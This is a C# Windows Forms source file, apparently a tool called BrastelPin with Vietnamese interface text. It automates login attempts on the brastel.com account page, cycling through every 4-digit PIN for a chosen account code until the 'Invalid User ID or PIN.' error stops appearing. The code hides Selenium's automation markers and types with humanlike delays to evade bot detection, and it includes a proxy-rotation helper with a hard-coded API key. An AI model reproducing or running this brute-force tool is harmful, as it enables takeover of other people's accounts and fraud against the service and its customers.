using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BrastelPin
{
    public partial class MainForm : Form
    {
        private GUIDataModel _gUIDataModel = null;

        private Queue<int> pinQueue = new Queue<int>();
        private object queueLock = new object();

        public MainForm()
        {
            InitializeComponent();
        }

        private async void btnStart_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(_gUIDataModel.AccountCode))
            {
                MessageBox.Show("Vui lòng kiểm tra account code");
                return;
            }
            if (_gUIDataModel.PinFrom > _gUIDataModel.PinTo)
            {
                MessageBox.Show("Vui lòng kiểm tra mã PIN");
                return;
            }
            //if (string.IsNullOrEmpty(_gUIDataModel.TMProxy))
            //{
            //    MessageBox.Show("Vui lòng kiểm tra TMProxy");
            //    return;
            //}

            // Khởi tạo queue PIN từ 0000 đến 9999
            pinQueue.Clear();
            for (int i = _gUIDataModel.PinFrom; i <= _gUIDataModel.PinTo; i++)
                pinQueue.Enqueue(i);

            rtbLog.AppendText($"[INFO] Bắt đầu kiểm tra mã PIN cho accCode: {_gUIDataModel.AccountCode}\n");

            ToogleControl(false);



            await Task.Run(() => WorkerThread());

            rtbLog.AppendText("[INFO] Đã hoàn tất kiểm tra toàn bộ mã PIN.\n");


            ToogleControl(true);
        }


        private void ToogleControl(bool enable)
        {
            txtAccountCode.Enabled = enable;
            txtPinFrom.Enabled = enable;
            txtPinTo.Enabled = enable;
            txtTMProxy.Enabled = enable;

            btnStart.Enabled = enable;
            btnStart.Enabled = !enable;
        }


        private void WorkerThread()
        {
            int windowWidth = 600;
            int windowHeight = 600;

            while (true)
            {
                int pin;

                lock (queueLock)
                {
                    if (pinQueue.Count == 0) return;
                    pin = pinQueue.Dequeue();
                }

                string pinStr = pin.ToString("D4");

                try
                {
                    ChromeOptions options = new ChromeOptions();

                    options.AddArgument("--disable-blink-features=AutomationControlled");
                    options.AddExcludedArgument("enable-automation");
                    options.AddAdditionalOption("useAutomationExtension", false);
                    options.AddArgument("--disable-notifications");
                    options.AddArgument("--log-level=3");
                    options.AddArgument($"--window-size={windowWidth},{windowHeight}");
                    //options.AddArgument("--headless");
                    using (IWebDriver driver = new ChromeDriver(options))
                    {
                        driver.Manage().Window.Size = new System.Drawing.Size(windowWidth, windowHeight);

                        ((IJavaScriptExecutor)driver).ExecuteScript("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})");

                        driver.Navigate().GoToUrl("https://www.brastel.com/eng/myaccount");

                        // accCodeInput
                        var accCodeInput = driver.FindElement(By.Id("accCodeInput"));
                        for (int i = 0; i < 10; i++)
                        {
                            accCodeInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
                            Thread.Sleep(15);
                        }
                        foreach (char c in _gUIDataModel.AccountCode)
                        {
                            accCodeInput.SendKeys(c.ToString());
                            Thread.Sleep(150);
                        }

                        // pinInput
                        var pinInput = driver.FindElement(By.Id("pinInput"));
                        for (int i = 0; i < 10; i++)
                        {
                            pinInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
                            Thread.Sleep(15);
                        }
                        foreach (char c in pinStr)
                        {
                            pinInput.SendKeys(c.ToString());
                            Thread.Sleep(150);
                        }
                        foreach (char c in pinStr)
                        {
                            pinInput.SendKeys(c.ToString());
                            Thread.Sleep(150);
                        }

                        // Button SIGN IN
                        var btnSignIn = driver.FindElement(By.XPath("//button[contains(text(), 'SIGN IN')]"));
                        ((IJavaScriptExecutor)driver).ExecuteScript("arguments[0].click();", btnSignIn);

                        Thread.Sleep(5000);

                        var findErrorDisplay = driver.FindElement(By.XPath("//span[contains(normalize-space(), 'Invalid User ID or PIN.')]"));
                        if (findErrorDisplay.Displayed)
                        {
                            this.Invoke(new Action(() =>
                            {
                                rtbLog.AppendText($"[CHECKED] PIN {pinStr} sai.\n");
                            }));
                        }
                        else
                        {
                            this.Invoke(new Action(() =>
                            {
                                rtbLog.AppendText($"[SUCCESS] Đăng nhập thành công với PIN: {pinStr}\n");
                            }));

                            break;
                        }

                    }
                }
                catch (Exception ex)
                {
                    this.Invoke(new Action(() =>
                    {
                        rtbLog.AppendText($"[ERROR] {ex.Message}\n");
                    }));
                }
            }
        }


        static async Task<ProxyResponse> GetProxyAsync()
        {
            string url = "https://tmproxy.com/api/proxy/get-new-proxy";
            string apiKey = "54c8857921a0062eacd0cc6457d7c37f";

            var json = $@"{{
            ""api_key"": ""{apiKey}"",
            ""id_location"": 0,
            ""id_isp"": 0
        }}";

            using (HttpClient client = new HttpClient())
            {
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                try
                {
                    HttpResponseMessage response = await client.PostAsync(url, content);
                    string result = await response.Content.ReadAsStringAsync();

                    // Deserialize JSON response
                    var proxyResponse = JsonConvert.DeserializeObject<ProxyResponse>(result);

                    if (proxyResponse != null && proxyResponse.code == 0)
                    {
                        return proxyResponse;
                    }
                    else
                    {
                        return null;
                    }
                }
                catch
                {
                    return null;
                }
            }
        }

        private void MainForm_Load(object sender, EventArgs e)
        {

            _gUIDataModel = GUIDataModel.LoadFromFile();
            txtAccountCode.Text = _gUIDataModel.AccountCode;
            txtPinFrom.Text = _gUIDataModel.PinFrom.ToString();
            txtPinTo.Text = _gUIDataModel.PinTo.ToString();
            txtTMProxy.Text = _gUIDataModel.TMProxy;
        }

        private void rtbLog_TextChanged(object sender, EventArgs e)
        {
            rtbLog.SelectionStart = rtbLog.Text.Length;
            rtbLog.ScrollToCaret();
        }

        private void UpdateGUIDataModel()
        {
            try
            {
                _gUIDataModel.AccountCode = txtAccountCode.Text;
                _gUIDataModel.PinFrom = int.Parse(txtPinFrom.Text);
                _gUIDataModel.PinTo = int.Parse(txtPinTo.Text);
                _gUIDataModel.TMProxy = txtTMProxy.Text;
                _gUIDataModel.SaveToFile();
            }
            catch
            {

            }
        }

        private void txtAccountCode_TextChanged(object sender, EventArgs e)
        {
            UpdateGUIDataModel();
        }

        private void txtPinFrom_TextChanged(object sender, EventArgs e)
        {

            UpdateGUIDataModel();
        }

        private void txtPinTo_TextChanged(object sender, EventArgs e)
        {
            UpdateGUIDataModel();
        }

        private void txtTMProxy_TextChanged(object sender, EventArgs e)
        {
            UpdateGUIDataModel();
        }

        private void txtPinFrom_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (char.IsControl(e.KeyChar))
                return;

            if (!char.IsDigit(e.KeyChar))
            {
                e.Handled = true;
                return;
            }

            TextBox tb = sender as TextBox;

            string newText = tb.Text.Insert(tb.SelectionStart, e.KeyChar.ToString());

            if (int.TryParse(newText, out int value))
            {
                if (value > 9999)
                    e.Handled = true;
            }
            else
            {
                e.Handled = true;
            }
        }

        private void txtPinTo_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (char.IsControl(e.KeyChar))
                return;

            if (!char.IsDigit(e.KeyChar))
            {
                e.Handled = true;
                return;
            }

            TextBox tb = sender as TextBox;

            string newText = tb.Text.Insert(tb.SelectionStart, e.KeyChar.ToString());

            if (int.TryParse(newText, out int value))
            {
                if (value > 9999)
                    e.Handled = true;
            }
            else
            {
                e.Handled = true;
            }
        }
    }
}